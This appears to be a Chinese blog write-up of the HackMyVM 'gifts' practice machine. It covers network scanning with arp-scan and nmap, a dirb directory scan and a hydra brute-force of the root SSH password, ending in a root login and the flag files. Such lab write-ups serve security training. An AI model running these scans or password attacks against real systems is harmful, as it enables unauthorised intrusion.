---
{"dg-publish":true,"title":"hackmyvm_gifts","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_gifts.md","permalink":"/安全/靶机/hackmyvm_gifts/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# arp-scan --interface=eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:8e:b5:08, IPv4: 192.168.124.27
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.124.1   88:2a:5e:21:1b:ef       New H3C Technologies Co., Ltd
192.168.124.8   10:a5:1d:71:1b:f5       Intel Corporate
192.168.124.5   12:aa:f8:19:52:b2       (Unknown: locally administered)
192.168.124.11  d4:67:d3:5c:04:71       GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD
192.168.124.33  08:00:27:15:00:21       PCS Systemtechnik GmbH
192.168.124.7   4e:f4:82:76:df:78       (Unknown: locally administered)
192.168.124.13  3a:f7:5a:50:13:87       (Unknown: locally administered)

9 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.645 seconds (96.79 hosts/sec). 7 responded
```

```
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nmap -sT -min-rate 10000 -p- 192.168.124.33
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 04:59 EST
Nmap scan report for 192.168.124.33 (192.168.124.33)
Host is up (0.010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:15:00:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 75.22 seconds

```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nmap -sT -sC -sV -O -p22,80 192.168.124.33
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 05:01 EST
Nmap scan report for 192.168.124.33 (192.168.124.33)
Host is up (0.0025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:15:00:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds

```


# web渗透?(ssh)

```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# dirb http://192.168.124.33/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Feb  9 05:06:51 2025
URL_BASE: http://192.168.124.33/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.124.33/ ----
+ http://192.168.124.33/index.html (CODE:200|SIZE:57)

-----------------
END_TIME: Sun Feb  9 05:07:20 2025
DOWNLOADED: 4612 - FOUND: 1

┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# curl http://192.168.124.33/index.html

Dont Overthink. Really, Its simple.
        <!-- Trust me -->

```

就扫出来这一个结果
感觉一无所获，试试爆破一下吧


```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# hydra -l root -P /usr/share/wordlists/rockyou.txt  192.168.124.33 ssh -vV -t 4

```


![Pasted image 20250209182747.png](/img/user/picture/Pasted%20image%2020250209182747.png)
破解的速度相当快
这密码确实很简单，但是这思路不常见。。。
因为22端口确实不是首先着手攻击的方向
爆破密码也只能算是下下策


```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# ssh root@192.168.124.33
The authenticity of host '192.168.124.33 (192.168.124.33)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.124.33' (ED25519) to the list of known hosts.
root@192.168.124.33's password:
IM AN SSH SERVER
gift:~# ls
root.txt  user.txt
gift:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
gift:~# pwd
/root
gift:~# cat root.txt
HMVtyr543FG
gift:~# cat user.txt
HMV665sXzDS

```















